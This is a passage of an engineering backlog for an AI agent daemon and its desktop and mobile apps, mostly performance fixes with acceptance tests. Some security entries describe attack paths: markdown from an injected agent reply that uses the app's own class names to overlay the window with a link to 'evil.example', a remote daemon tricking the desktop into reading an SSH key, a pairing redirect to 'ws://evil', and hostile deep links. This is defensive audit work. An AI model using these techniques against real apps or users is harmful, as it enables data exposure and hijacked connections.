  and nothing runs it: no workflow, not `scripts/validate.py`, not the hook. On 2026-11-18 it reported pillow
  12.3.0 (fixed in 13.0.0), pypdf 6.21.0, filelock 3.28.0, setuptools 81.0.0 and certifi. `uv lock --dry-run
  --upgrade-package …` moves certifi, filelock, pypdf (to 7.0.1, a major) and setuptools today; pillow does not
  move, either because of the seven-day cooldown or a cap in another dependency (find out which).
  accept: `scripts/validate.py` runs `pip-audit` on the locked versions when `uv.lock` or `pyproject.toml` changed,
  and `publish.yml` runs it on every release; an advisory fails unless an allow file names it with a reason and an
  expiry date; a network failure is reported as not checked, never as a pass; the lock moves the four packages and
  the knowledge-ingest tests pass on pypdf 7; pillow is upgraded or listed in the allow file with what holds it; a
  release-script test asserts the workflow step.

- **SEC.ACTIONS-PIN** — Every GitHub action is pinned to a commit
  `chore · alpi · agent · normal`
  note: the repository half of SEC.REPO-GOVERNANCE. All seven workflows use mutable refs (`actions/checkout@v4`,
  `tauri-apps/tauri-action@v0.6.2`, `dtolnay/rust-toolchain@stable`, `pypa/gh-action-pypi-publish@release/v1`, …)
  in jobs that hold the Tauri signing key, the Apple credentials and the PyPI and Docker Hub publish rights. Build
  tooling: no product bump.
  accept: every `uses:` names a 40-character SHA with the version in a comment; `.github/dependabot.yml` covers
  `github-actions`, the Python lock, both JS trees and Cargo; a release-script test fails on any `uses:` that is
  not a SHA; one release of each pipeline still publishes.

- **SEC.COMPOSE-HARDEN** — The shipped compose file drops what the container does not need
  `chore · alpi · agent · low`
  note: the image runs as uid 1000, but [docker-compose.yml](../docker-compose.yml) sets no `cap_drop`, no
  `security_opt: ["no-new-privileges:true"]` and no pids or memory limit, and the base images
  (`python:3.11-slim-trixie`, `node:24-trixie-slim`, `caddy:2-alpine`) are tags, not digests. Whether the browser
  and the shell sandbox still start under `cap_drop: [ALL]` is unknown: this needs a creator `verify` on a real
  container before any deployed compose file adopts it.
  accept: the compose file carries the three settings and the images are pinned by digest; the image smoke test
  launches the browser under them; DEPLOYMENTS.md and its reference say what each one does.

#### Daemon runtime

- **DAEMON.RETENTION-SCAN** — Deleting sessions scans the run journals once, not once per session (D3)
  `bug · alpi · agent · high`
  note: `_apply_sessions` in [cleanup.py](../alpi/cleanup.py) (`:667`) and `_delete_owned_session` in
  [handlers.py](../alpi/host/handlers.py) (`:172`) call `runs.running_session_ids()`
  ([runs.py](../alpi/runs.py) `:878-900`, which opens every journal twice) for each session id, inside
  `sessions_lock(exclusive=True)`. `Session.save` and `runs.start` take the shared lock, so no turn of that profile
  starts or saves meanwhile. Measured: 0.55 s per call at 10,000 journals, so 200 ids take about two minutes and a
  first retention sweep of 3,000 expired sessions about half an hour. Fix shape: compute the running set once per
  exclusive hold (it cannot grow while the lock is held, because `runs.start` needs the shared lock) and delete in
  chunks of 50 ids, releasing the lock between chunks.
  accept: with 2,000 journals and 100 expired sessions, `runs.summary` is called once per journal per chunk, not
  once per session; a `Session.save` from another thread completes between two chunks; a session with a live run
  is still never deleted (the existing safety tests stay green).

- **DAEMON.SUB-IO** — Subscription writes leave the event loop (D1)
  `bug · alpi · agent · high`
  note: `pull` in [workgroup_client.py](../alpi/alp/workgroup_client.py) (`:1656`) and four sites in
  [service.py](../alpi/service.py) (`:1288`, `:1330`, `:2849`, `:4068`→`:4125`) call `sub_mod.mutate` from a
  coroutine. A changed mutate takes a blocking `flock`, loads, dumps the whole file, fsyncs and replaces it
  ([subscription.py](../alpi/alp/subscription.py) `:675-695`): 8 ms at 12 subscriptions, 36 ms at 56 (2 MiB), 69 ms
  at 5 MiB. The read side of this file was fixed in 0.11.15; the write side still runs on the loop. Fix shape: send
  those calls through the `_sub_io` pool that already exists (`service.py:671`); every caller awaits the result
  before it reads the subscription back.
  accept: a test records the thread that runs `mutate` for a pull that brings posts, for a cursor advance and for
  a dispatch stamp, and each is an `alpi-sub-io` thread; the workgroup poller tests stay green.

- **DAEMON.OUTPUTS-FAST** — Reading the inbox does not re-clean every notification (D5)
  `bug · alpi · agent · high`
  note: `_read_all` in [outputs.py](../alpi/outputs.py) (`:336-364`) runs `normalize_notification_body` on every
  row, and `sanitize_emoji` (`:57-63`) tests each character against a list of ranges in Python (`:48-54`). It runs
  for `list_outputs`, `read`, `append`, `mark_read`, `mark_unread`, `delete` and `mark_all_read`, under one
  process-wide lock (`:325`). Measured with 500 rows of 1.9 KB: 250 ms for each of those operations, 1.3 s for
  `host.outputs.list {all: true}` over five profiles; parsing the same JSON takes 1 ms. It holds the GIL, so a
  thread does not spare the loop. Fix shape: one precompiled regular expression built from `_EMOJI_RANGES` and
  `_EMOJI_SINGLES` minus `_ALLOWED_EMOJI`; `_read_all` cached per home by `(mtime_ns, size)` and dropped on every
  write.
  accept: the new `sanitize_emoji` equals the old one (kept as a test helper) on the existing normalisation tests
  and on 2,000 random strings that mix emoji, allowed emoji and text; a second `list_outputs` with no write in
  between normalises no row (a spy); a write invalidates the cache.

- **DAEMON.BIND-FIRST** — The host socket accepts before the journal sweep and the model library load (D4, D13)
  `bug · alpi · agent · normal`
  note: `_main_all` calls `_start_new_profiles` (`service.py:251`), which runs `_sweep_runs` on the loop for every
  profile (`:300`) before any task starts; the journal cache is in memory, so each restart is cold (1.6 s for
  14,000 journals). The first loop iteration then starts `alp` before `host` (`:572-574`), and
  `from alpi.alp import handlers` (`:4256`) and [host/approval.py](../alpi/host/approval.py) (`:42`) import litellm
  (1 s). Separately, `host.network.status` calls `resolve_host_endpoints(home)` on the loop
  ([network_rpc.py](../alpi/host/network_rpc.py) `:109`), which with no configured host runs `tailscale ip -4` and
  `ifconfig` with 2 s timeouts each; the thread probe just before it (`:91`) does not fill the 30 s cache. Pairing
  takes the same path (`connections.py:1180,1207`). This is the class of bug behind the 35-second socket.
  accept: no `_sweep_runs` runs before the socket binds (the first reconcile pass runs it in a thread, with
  `ensure_history_loaded()` still before the first alert); `host` is first in `_profile_tasks`; a subprocess test
  imports `alpi.host.server` and `alpi.host.approval` and finds no `litellm` in `sys.modules`;
  `resolve_host_endpoints` and `_pairing_network` run off the loop thread (a thread-identity spy) and the probe
  warms the `detect_bind_ip` cache.

- **DAEMON.WS-CONCURRENT** — A slow request does not hold the other requests on its socket (D6)
  `bug · alpi · agent · normal`
  note: [server.py](../alpi/host/server.py) awaits `dispatch` inside `async for message in ws` (`:692`, `:711`), so
  requests on one socket run one after another; the per-device cap of eight only counts across sockets. The phone
  multiplexes one socket per daemon (`mobile/src/lib/rpc.js:132`). Measured: a 1 s request followed by two instant
  ones answered at 1.04, 1.06 and 1.06 s. Fix shape: each non-stream request runs as a task tracked per socket,
  cancelled on close and counted by `_begin_device_rpc`; the token is still checked per message before the task
  starts, and the `_ws_policy_replies` grace logic keeps its behaviour.
  accept: with a fake socket, the two fast replies arrive before the slow one; a ninth concurrent request is
  refused as today; a token revoked mid-flight still closes the socket with 1008; closing the socket cancels its
  tasks.

- **DAEMON.SUMMARIES-SCAN** — Profile summaries read each sessions directory once, and only when it changed (D7)
  `chore · alpi · agent · normal`
  note: `_latest_chat_for` and `_counts` in [device_state.py](../alpi/host/device_state.py) (`:175-201`) each walk
  every session ([sessions.py](../alpi/host/sessions.py) `:53`, `:68`) with `iterdir`, `is_file` and two `stat`s:
  62,000 `stat` calls and 200 ms for 10,000 sessions. The 3 s cache is dropped by every session save.
  accept: one `os.scandir` pass computes the count and the latest chat; the result is kept per profile and reused
  while the `sessions/` directory's `mtime_ns` is unchanged (`Session.save` replaces a file there, so it moves); a
  test counts filesystem calls for two summaries with no change and finds a number that does not grow with the
  session count; a save between two calls refreshes the row.

- **DAEMON.FOLD-ONCE** — Listing workgroups folds each transcript once (D8)
  `chore · alpi · agent · normal`
  note: `_FOLD_CACHE_CAP = 64`, first in first out ([host/workgroup.py](../alpi/host/workgroup.py) `:297`,
  `:436-441`), and `host.workgroups.list` calls `_pipeline_status`, `_pipeline_phase` and `_add_pipeline_note`, each
  a separate `fold_task_state` (`device_state.py:1749`, `:1774`, `:1777`, `:909-918`). With 136 workgroups a warm
  request re-ran 68 folds and decrypted all 12 hub transcripts again (140 ms; 62 ms with the cap raised). This is
  the fold reuse left undone in 0.18.
  accept: one fold per workgroup per request, with status, phase and note derived from it; the cache is LRU and
  holds at least 4,096 entries; `pipeline_defs` reads the definitions without building a full subscription; a test
  with 70 workgroups counts `decrypt_transcript` calls across two list requests and finds none on the second.

- **DAEMON.CHAT-STREAM** — A stalled client does not stop a turn's replay file or its lock (D10, D15)
  `bug · alpi · agent · normal`
  note: in [chat.py](../alpi/host/chat.py) (`:349-364`, `:372-376`, `:409-455`) one consumer loop persists a frame
  and then awaits `send_frame`. When the client stops reading, the sidecar stops too (a second device tailing sees
  nothing), heartbeats stop, the unbounded queue takes the rest of the turn and the session stays busy after the
  engine ends. Each token is its own frame: a thread hop, a redaction and a file append
  ([_chat_events.py](../alpi/host/_chat_events.py) `:70-103`). In [events.py](../alpi/host/events.py)
  (`:224-229`, `:247`) a subscriber whose queue is full loses frames with no sign of it. Read, not reproduced.
  accept: adjacent `assistant_delta` or `reasoning_delta` frames already waiting in the queue are merged before
  they are persisted and sent (no added delay); a wire send that does not finish in time marks the stream dead
  while persistence continues to `done` and the session lock is released (a test with a `send_frame` that never
  returns); an event subscriber that overflows is closed, so the client backfills through `host.events.history`.

- **DAEMON.YAML-CACHE** — Configuration and connection files are parsed once per change (D14)
  `chore · alpi · agent · normal`
  note: `config.load` ([config.py](../alpi/config.py) `:425`) uses `yaml.safe_load` with no cache at 89 call sites:
  1.9 ms each against 0.2 ms with `yamlfast`, on the loop every 5 s per profile (`service.py:554`, `:333`), in
  `host.version` and on every ALP request. `connections.yaml` is read and written with the same loader
  ([connections.py](../alpi/host/connections.py) `:394`, `:406`) and its handlers run their lock and parse on the
  loop (`:1167-1330`): `register_device`, sent at every app launch, 18 ms. `_load_yaml` in `device_state.py`
  (`:1853`) is the third.
  accept: the three use `yamlfast.safe_load`; `config.load` caches the parsed file by `(mtime_ns, size)` and
  returns a deep copy, with environment overrides still applied on every call; the connection handlers run off the
  loop; tests: mutating a returned config leaves the next load intact, editing the file is seen at once, and the
  libyaml edge cases `yamlfast` documents are covered.

- **DAEMON.BLOBS-OFF-LOOP** — Large files are measured before they are read, and encoded off the loop (D12)
  `bug · alpi · agent · normal`
  note: `host.profile.read_file` reads the whole file on the loop and then cuts it to 256 KB
  ([device_state.py](../alpi/host/device_state.py) `:367-369`), so reading `knowledge.sqlite` loads all of it.
  `host.attachments.fetch` reads and base64-encodes on the loop before its size check
  ([attachments_rpc.py](../alpi/host/attachments_rpc.py) `:240-247`), and `stage` decodes and writes there (`:74`,
  `:93`). A 20 MB attachment blocks the loop about 0.7 s, most of it compression.
  accept: `read_file` reads at most the cap plus one byte, inside `run_read`; `fetch` checks the size with `stat`
  before reading; fetch and stage encode, decode and write in a thread; a test with a 50 MB sparse file asserts
  the number of bytes read.

- **DAEMON.HUB-CACHE** — Hub transcripts are parsed once and forgotten with their workgroup (D9, D11)
  `chore · alpi · agent · low`
  note: `_HUB_DECRYPT_CACHE` ([service.py](../alpi/service.py) `:2520`, `:2548`, `:2572`) keeps the ciphertext and
  plaintext of every hub transcript for the life of the process, deleted workgroups included: 24 MB for 12
  workgroups of 600 posts. `workgroup.pull` on the hub parses the whole `transcript.jsonl` on the loop for each
  pull ([alp/workgroup.py](../alpi/alp/workgroup.py) `:1728-1757`, `:1033`) and each held long-poll stats it every
  0.5 s.
  accept: entries for workgroups absent from `active_hubs` are dropped in the prune loop that exists
  (`service.py:1093-1100`); pulls share one parsed transcript keyed by `(mtime, size)`; a test deletes a workgroup
  and finds no entry.

- **DAEMON.LIST-LIMITS** — A list request with a limit builds only the rows it returns (D16)
  `chore · alpi · agent · low`
  note: `host.sessions.list` builds every row and applies `limit` afterwards
  ([handlers.py](../alpi/host/handlers.py) `:93-99`); `host.runs.list` stats every journal and summarises 200
  whatever the limit ([host/runs.py](../alpi/host/runs.py) `:35`); the session row cache of 8,192 entries is shared
  by all profiles ([sessions.py](../alpi/host/sessions.py) `:110`), so five profiles of 2,000 sessions evict each
  other.
  accept: with `limit: 20` the two verbs open at most 20 files after ordering by the directory listing; the row
  cache is sized per profile; tests count the files opened.

#### Harness

- **HARN.COMPLETE-TIMEOUT** — A model call that does not stream has a deadline and a retry (H3)
  `bug · alpi · agent · normal`
  note: `complete()` in [llm.py](../alpi/llm.py) (`:678-709`) passes no `timeout`, and the library's default is
  6,000 seconds. Fourteen callers use it, among them `research` (`research.py:281,368`), `delegate`
  (`delegate.py:350,434`), the compaction summary (`engine.py:2122,2177`), `web_extract`, `read_image` and
  knowledge maintenance. `research` and `delegate` are exempt from the tool deadline because they "bound
  themselves", but by steps and cost, not time, and on any exception they return "LLM call failed" and drop what
  they gathered although `_partial_report` exists.
  accept: `complete()` passes `runtime.stream_max_duration_s` as its timeout (`0` keeps it off) and retries a
  transient error `runtime.max_retries` times with the existing `_is_transient` and `_backoff_sleep`; `research` and `delegate` return their
  partial report on the final failure; fake-provider tests: a call that hangs raises within a small timeout, a
  transient error then a success makes one retry, and `research` returns the partial report.

- **HARN.SUMMARY-BACKOFF** — A failed compaction summary is not asked again on the next step (H4)
  `bug · alpi · agent · normal`
  note: when the summariser returns nothing, [engine.py](../alpi/engine.py) (`:2090-2126`) and
  [compaction.py](../alpi/compaction.py) (`:470-484`) try again on every step with a window-sized prompt. With a
  fake model on a 112,000-token window, ten steps made ten summary calls of about 83,000 tokens each, against two
  calls when the summariser works.
  accept: after an empty or failed summary the next attempt waits until the middle has grown by a quarter or five
  steps have passed, and a `summary_failed` line is written to `compaction.jsonl`; a fake-model test with an empty
  summariser makes at most two summary calls in ten steps.

- **HARN.PREFIX-BY-ACTION** — Denying an action removes its parameters and its manual from the tool schema (H1)
  `feature · alpi · agent · normal`
  note: only `Knowledge` declares `action_parameters`
  ([knowledge_base.py](../alpi/tools/knowledge_base.py) `:1400`; the mechanism is in
  [tools/__init__.py](../alpi/tools/__init__.py) `:105-129` and [base.py](../alpi/tools/base.py) `:39`). `memory`
  cut to `read` still carries its 4,914-character write manual and all seven parameters
  ([memory.py](../alpi/tools/memory.py) `:75`); `skill` cut to three actions still carries 21 parameters
  ([skill.py](../alpi/tools/skill.py) `:579`); `schedule` is the third ([schedule.py](../alpi/tools/schedule.py)
  `:25`). Those three are 4,560 of the 14,712 schema tokens, and an action-level deny saves 39. The executor
  already refuses a denied action.
  accept: `Skill`, `Memory` and `Schedule` declare `action_parameters` and build their description from one
  paragraph per action, so a denied action's enum value, its own parameters and its paragraph are absent; with no
  deny, each of the three schemas is byte-identical to today's (deployed profiles keep their cached prefix);
  `tests/test_tool_schemas_cacheable.py` gets a ceiling for a profile with `memory` read-only and `skill` limited
  to `list`, `view` and `run`.

- **HARN.PROMPT-SECTIONS** — The system prompt describes only the tools the profile has (H1)
  `feature · alpi · agent · normal`
  note: [prompt_cache.py](../alpi/prompt_cache.py) (`:142-180`) is deny-aware only for `knowledge_rule` (`:166`). A
  profile without `skill`, the web tools or `memory` still receives the Skills (861 tokens), Web access (705),
  Recall (628) and Memory (415) sections of [system_prompt.md](../alpi/prompts/system_prompt.md). The
  pronoun-routing block is in both the `memory` description and the base prompt, and the "write in English" rule is
  repeated in `memory`, `skill` and `schedule`. Changing the default prompt costs every profile one uncached
  prefix on deploy.
  accept: each of the four sections is rendered only when a tool it names is in the turn's schema set; the
  pronoun-routing block and the language rule each appear once; a test builds the prompt for a profile that denies
  `skill`, `memory` and the web tools and finds none of the four headings; the part order stays `PART_ORDER`.

- **HARN.MCP-START** — MCP servers start together (H6)
  `chore · alpi · agent · low`
  note: servers spawn one after another inside `Engine.__init__`
  ([mcp/registry.py](../alpi/mcp/registry.py) `:94-98`, [engine.py](../alpi/engine.py) `:332`): three servers of
  0.5 s each cost 1.6 s before the first model byte, in every scheduled fire. Each MCP tool also carries a
  52-token caveat (`_wrap_description`, `registry.py:244-252`), half of the schema tokens of a 45-tool server; it
  is a security control and stays unless the creator says otherwise.
  accept: servers are spawned concurrently, at most four at a time, and the registry is the same as a serial
  start produces; a test with three fake servers that each sleep finds the total near one sleep, asserted by the
  overlap of their start and end marks, not by time.

- **HARN.BATCH-PARALLEL** — Read-only tool calls in one batch overlap (H7)
  `feature · alpi · agent · low`
  note: a batch runs in parallel only when every call is `parallel_safe`, and only `read_file`, `search`,
  `web_fetch` and `web_search` are ([engine.py](../alpi/engine.py) `:1268-1293`,
  [tool_executor.py](../alpi/core/tool_executor.py) `:151-170`). Three safe calls and one exclusive call run fully
  in series. MCP tools, `knowledge` search, the session recall tools, `alpi_knowledge`, `skill` view and list, and
  `memory` read never overlap.
  accept: consecutive safe calls inside a mixed batch run together and results keep the order of the calls; the
  read-only actions above are declared through `is_parallel_safe(arguments)`; an MCP tool with `readOnlyHint` is
  safe; tests with fake tools assert the overlap and the order; the knowledge store and the embedder are exercised
  from two threads.

- **HARN.OUTPUT-CUT** — A cut tool result keeps its end, and the journal records its full size (H8)
  `feature · alpi · agent · low`
  note: `apply` in [_budget.py](../alpi/tools/_budget.py) (`:5`, `:29-35`) keeps the first 100,000 characters and
  drops the rest, though a shell's error is usually at the end. The journal clips output to 12 KB, so the real
  size distribution cannot be read from it.
  accept: a cut keeps the head and the last fifth of the cap with one elision marker between them;
  `tool.finished` carries `output_chars`, the length before the cut, optional for every reader; the default cap is
  unchanged.

- **HARN.SMALL-WASTE** — Five places where a turn spends a model call it does not need (H9, H11)
  `bug · alpi · agent · low`
  note: one per commit. The wrap-up call drops the tools array on the largest prompt of the turn
  ([engine.py](../alpi/engine.py) `:1632-1673`), which changes the cached prefix: keep the schemas and pass
  `tool_choice="none"`. The open-todo nudge has no limit (`:1115-1133`). `ProviderStreamDeadline` is retried like a
  stall, so a slow call can run three times ([llm.py](../alpi/llm.py) `:669`). The fallback model is tried only
  after every retry of the first. Candidate extraction after a compaction blocks the next step
  (`engine.py:2171-2189`).
  accept: a test per item: the wrap-up request carries the same tools as the step before it; the nudge fires at
  most twice per turn; a deadline is not retried; the fallback is tried after the first stall; extraction runs
  after the turn.

- **HARN.019-VERIFY** — The prune threshold and the smaller prefix lower the cost on the deployed daemons
  `verify · alpi · creator · normal`
  depends: HARN.PREFIX-BY-ACTION
  accept: after a week on the release, from the ledgers: input tokens at the 90th percentile and the cache-hit rate
  of the profiles with the longest turns, against the week before; the count of `prune` lines; no rise in
  repeated-read tool calls, which would mean the model lost output it needed.

#### Desktop

- **DESK.SEC-MD-CLASS** — Markdown from the agent cannot use the app's own class names (DS1)
  `bug · desktop · agent · high`
  note: `PURIFY_OPTS` in [markdown.js](../desktop/src/lib/markdown.js) (`:88-100`) allows raw `div`, `a` and `button`
  with a `class` attribute. CSS-module names are stable in a build (`._backdrop_1jzcr_1` is
  `position: fixed; inset: 0` at a modal z-index), so an injected reply containing
  `<a href="https://evil.example/?q=…" class="_backdrop_1jzcr_1">&nbsp;</a>` covers the window and any click opens
  that URL in the browser. The sanitiser's output was verified; the visual result was not.
  accept: the `afterSanitizeAttributes` hook keeps only the class tokens the renderer itself emits (list them
  first; today they start with `md-` or `ch-`); `renderMarkdown('<a class="_backdrop_x" href="https://e">x</a>')`
  contains no `_backdrop_x`; the table, code, figure and chart tests are unchanged.

- **DESK.SEC-PATHS** — The desktop reads a local file only when the user or the local daemon named it (DS2)
  `bug · desktop · agent · normal`
  note: `path_within_allowed` in [lib.rs](../desktop/src-tauri/src/lib.rs) (`:2971-2998`) trusts the `roots` the
  webview sends, and its own test (`:4414`) accepts `("/etc/hosts", ["/etc"])`.
  [AttachmentChips.jsx](../desktop/src/primitives/AttachmentChips.jsx) (`:18-21`) and
  [ProducedImages.jsx](../desktop/src/primitives/ProducedImages.jsx) (`:18-19`) pass `roots: [dirname(path)]` with
  a path taken from session history, and `fileKind` calls anything with an `image/*` mime an image. A remote
  daemon that returns `{path: "/Users/u/.ssh/id_ed25519", mime: "image/png"}` makes the desktop read that file into
  the webview. No path sends the bytes back; it is a read the user did not ask for.
  accept: `attachment_thumb` and `save_file_as` take the connection id; for a remote connection extra roots are
  ignored and only a path registered in Rust state by `pick_files`, a drop or `save_text_file` is read; a file
  that does not start with an image signature is not returned as a thumbnail; a Rust test reads nothing for an
  unregistered file outside the fixed roots with `roots = [its directory]`; the local connection behaves as today.

- **DESK.PERF-ROSTER** — A roster refresh that changes nothing re-renders nothing (DP1)
  `bug · desktop · agent · high`
  note: [useHostConnections.js](../desktop/src/hooks/useHostConnections.js) (`:278`) calls `setProfiles(ps)` with a
  new array on every reload: the 60 s poll and each `session_changed`, config, schedule or workgroup event, at
  least twice per turn. `profiles` is a prop of the memoised `Transcript`, `HistoryTurns` and `Turn`
  ([ChatPane.jsx](../desktop/src/pages/ChatPane.jsx) `:490`, `:661`, `:717`), where `Turn` needs only the peer's
  accent and shape, so every turn of the open session re-renders. Each `Turn` also holds its own
  `subscribeTts(setTtsState)` (`:755`), so any speech state change re-renders them all.
  accept: `setProfiles` and `setWorkgroups` are skipped when the serialised roster equals the last one
  (`saveToCache` at `:185` already builds the string); `Turn` receives the derived accent and shape; speech state is
  read through one `useSyncExternalStore` selector that answers "is my key active"; a test renders 50 turns with a
  render counter, supplies an equal roster and emits a speech event for another key, and counts no `Turn` render.

- **DESK.PERF-STREAM-MD** — A streaming answer parses only its open tail (DP3)
  `bug · desktop · agent · normal`
  note: every 50 ms flush, [StreamingMarkdown.jsx](../desktop/src/features/StreamingMarkdown.jsx) (`:40-56`) parses
  and sanitises the whole message and replaces its HTML, and `renderMarkdown` stores every prefix as a cache key
  ([markdown.js](../desktop/src/lib/markdown.js) `:115-129`). `marked` alone re-parses 250 MB for a 100 KB answer
  (8 s) and 1 GB for 200 KB; one 100 KB answer keeps 345 MB in the cache until 500 later renders evict it, and
  evicts the finished messages' entries. Selection in the streaming message is lost at each flush.
  accept: streaming text bypasses the cache; the stream is split at the last top-level token boundary
  (`marked.lexer` tokens carry `raw`), closed blocks are memoised children and only the tail is parsed again; a
  test streams a 200 KB document in 20-character deltas and finds the total characters parsed under three times
  the document, the cache size unchanged and the earlier block nodes kept; the final HTML equals the non-streaming
  render for documents with a chart, a table, a loose list and reference-style links.

- **DESK.PERF-STREAM-STORE** — Streaming re-renders the answer, not the app (DP4)
  `bug · desktop · agent · normal`
  note: `pendingTurns` is state of `App` ([useChatStream.js](../desktop/src/hooks/useChatStream.js) `:29`,
  [App.jsx](../desktop/src/App.jsx) `:412`), so each flush re-runs `App` and re-renders `Sidebar` (its memo broken
  by a new `pendingProfiles` set, `:1063-1069`), the composer, the header, the palette (`useCommands` recomputes,
  `:1442`) and the panels; the global `keydown` listener is removed and added again (`:1000-1035`) and the stall
  watchdog interval is recreated (`useChatStream.js:347-362`).
  accept: pending turns live in a module store read with `useSyncExternalStore`; `App` selects the key string of
  the pending profiles and the foreground turn's status, and only `PendingTurn` subscribes to the text; an
  `App.mount` test with render counters pushes 20 `assistant_delta` frames and counts no render of `Sidebar` or
  `ChatComposer`.

- **DESK.PERF-WINDOW** — A long session loads and draws the part the user is looking at (DP2)
  `feature · desktop · agent · normal`
  note: [session-open.js](../desktop/src/lib/session-open.js) (`:9-10`, `:72-107`) loads the last 60 turns and then
  every earlier one in chunks of 100; `HistoryTurns` maps them all (`ChatPane.jsx:681`). A 2,000-turn session costs
  20 requests, 2,000 mounts and 4,000 markdown parses, and stays in `_memory`
  ([session-cache.js](../desktop/src/lib/session-cache.js) `:10`) with no cap.
  accept: an earlier chunk is requested only when the scroll nears the top (`useScrollAnchor` already compensates
  for prepends); `.turn` has `content-visibility: auto` with a `contain-intrinsic-size`; `_memory` keeps the eight
  most recent sessions; transcript search and export load the remaining turns before they run; tests cover the
  request trigger, the eviction and a search hit in a turn that was not loaded.

- **DESK.WATCHER** — Local file changes do not refresh a remote daemon's roster (DP6)
  `bug · desktop · agent · normal`
  note: [watcher.rs](../desktop/src-tauri/src/watcher.rs) (`:42-68`) watches `~/.alpi` recursively and `App.jsx`
  (`:818`) applies `fs-change` whatever the active connection, so the local daemon's writes reload a remote roster,
  and on a local connection each session save triggers both `fs-change` and `session_changed`. It also sits badly
  with the rule that clients reach the daemon through `host.*` only.
  accept: `fs-change` is ignored unless the active connection is local; an `App` test with a remote connection
  sends `fs-change` and counts no `profile_summaries` call. The note of the commit lists every writer outside the
  daemon (TUI, CLI) and whether it reaches the host event bus, which decides a later entry that removes the
  watcher.

- **DESK.PERF-THUMBS** — A thumbnail is a small image, and the image cache has a size (DP5)
  `chore · desktop · agent · low`
  note: `attachment_thumb` ([lib.rs](../desktop/src-tauri/src/lib.rs) `:3001-3020`) returns the whole file, up to
  6 MB, as a data URL and [markdownImages.js](../desktop/src/lib/markdownImages.js) (`:12`) keeps every one for the
  life of the app.
  accept: the image is scaled once to the tile size and kept as an object URL in a bounded LRU; the full file is
  read only for the lightbox; the scaler is injected so a unit test covers the LRU and the eviction's
  `revokeObjectURL`.

- **DESK.BRIDGE** — The bridge reuses its TLS setup, probes less and backs off when a daemon refuses (DP7, DP8, DP10)
  `chore · desktop · agent · low`
  note: one per commit. [host_client.rs](../desktop/src-tauri/src/host_client.rs) builds a root store and a client
  config per connection (`:2282-2291`), so no TLS session is resumed; a stream frame is parsed twice
  (`:1919-1925`, `:2001-2006`). The 30 s probe loop (`lib.rs:4126-4129`) calls `host.profiles.list`, discards it,
  and rewrites `connections.json` each time. A stream that ended on an error frame counts as success
  (`lib.rs:3862-3866`), so a daemon answering `too-many-connections` is retried every 2 s, and the path without a
  device id probes every 2 s with no backoff (`:3728-3732`). `MemoryModal.jsx` (`:100-108`) and `ScheduleModal.jsx`
  (`:114-129`) reload once per replayed frame.
  accept: one shared client config (a test compares the pointer of two connects); the probe is skipped while a
  stream frame is recent, calls `host.version` only and persists `last_connected` at most hourly; the sleep
  decision is a pure function in `event_dispatch.rs`, tested for both cases; the two modals coalesce with the
  300 ms window `useProfileSnapshot.js` uses.

#### Mobile

- **MOB.SEC-PAIR** — Pairing never replaces a saved connection's address or token unseen (M-S1, M-S2)
  `bug · mobile · agent · high`
  note: `saveConnection` in [store.js](../mobile/src/lib/store.js) (`:136-146`) replaces the single saved
  connection whose `deviceId` equals the one the answering daemon reports, keeping its local id and role and taking
  the new URL, token and label. Every authenticated client sees a daemon's `device_id` in `host.version`, so an
  endpoint that answers `exchange_pairing` with a victim daemon's id redirects that connection and destroys its
  token. `handleScan` in [pair.jsx](../mobile/app/pair.jsx) (`:203-208`) pairs at once, with no host confirmation
  (the confirm at `:123` fires only for a link routed from outside), and `parseJson` in
  [pairing.js](../mobile/src/lib/pairing.js) (`:88-105`) accepts a raw `token`, although the daemon's QR carries
  only a one-time grant.
  accept: a connection is replaced only when matched by its local id, by device id and connection id together, or
  by device id when the URL host equals the saved one; otherwise a second row is added (two routes to one daemon
  already work as a group); a scanned payload with `token` or `t` is refused, and a scan whose host matches no
  saved connection opens the existing host confirm; tests: saving `{deviceId: 'D', url: 'ws://evil'}` over
  `{deviceId: 'D', url: 'ws://a'}` yields two connections and the first keeps its token; `handleScan` with a token
  never calls `addConnection`.

- **MOB.RECOVER-PAGING** — Recovering a turn after a stall replays all of it (M8)
  `bug · mobile · agent · high`
  note: `tryRecoverFromSidecar` in [useChatSend.js](../mobile/src/hooks/useChatSend.js) (`:277-303`) asks
  `host.chat.events_since` with `after_seq: 0, limit: 1000`, clears the visible turn and applies that one page. The
  daemon stores a frame per token, so a turn passes 1,000 frames in 12 to 33 seconds: the reply shrinks to an
  earlier prefix, `sawDone` stays false and the same page is fetched again 15 s later.
  accept: the hook pages with `after_seq = next_seq` until a short page and applies the frames only when it has
  them all; the visible turn is not cleared before that; a test with a fake `call` returning 1,000 events and then
  200 with `done` finds the text of both pages and `recovered` true.

- **MOB.PROBE-FLICKER** — An unreachable daemon stays "offline" between retries (M7)
  `bug · mobile · agent · high`
  note: [EndpointProvider.jsx](../mobile/src/lib/EndpointProvider.jsx) sets `'probing'` at every retry (`:36-40`)
  on a fixed 4 s interval that ignores `AppState` (`:131-139`), and `DaemonBanner` does not count `'probing'` as
  down (`:27-30`). With a host that drops packets the banner unmounts and returns each cycle, the composer and
  every inbox row toggle, and all 68 `useEndpoint()` consumers render twice per cycle.
  accept: `'probing'` is set only while there is no settled status; retries back off 4, 8, 16, 30 s and stop while
  the app is not active; a test with a probe that resolves `offline` advances the timers and finds the state never
  leaves `'offline'` and the probe count on the backoff.

- **MOB.PERF-OUTPUTS** — The unread count costs one request (M3)
  `bug · mobile · agent · high`
  note: [useUnifiedOutputs.js](../mobile/src/hooks/useUnifiedOutputs.js) (`:33-65`, `:116-149`) calls
  `host.profile.summaries` and then `host.outputs.list` per profile, 100 rows with full bodies, on mount, on every
  output event and on every status change, in each of its three consumers; two of them use only the length. The
  daemon serves `host.outputs.list {all: true}` with an `aggregate` marker and the desktop uses it
  ([useOutputs.js](../desktop/src/hooks/useOutputs.js)). Each per-profile call costs the daemon a full inbox read,
  and they queue on the phone's single socket.
  accept: the hook asks `{all: true, status, limit}` first and falls back to the fan-out only when the reply lacks
  `aggregate`; one module-level store serves every consumer of the same connection set; a test with an rpc spy
  counts one call on a daemon that aggregates and 1 + N on an older one.

- **MOB.SEC-INTENT** — A link opened by the system reaches only known routes with known parameters (M-S4)
  `bug · mobile · agent · normal`
  note: `redirectSystemPath` in [+native-intent.js](../mobile/app/+native-intent.js) (`:20-24`) rewrites pairing
  links, strips `draft` and passes every other path and query through; the project's own test states it.
  `alpi://profile/<p>/peers/accept?pubkey=K&address=A&suggested=h` opens Accept peer filled in
  ([accept.jsx](../mobile/app/profile/[id]/peers/accept.jsx) `:24-58`), where one tap calls
  `host.peers.pending_accept` with an address the link chose. `?intent=delete` opens the delete confirm and
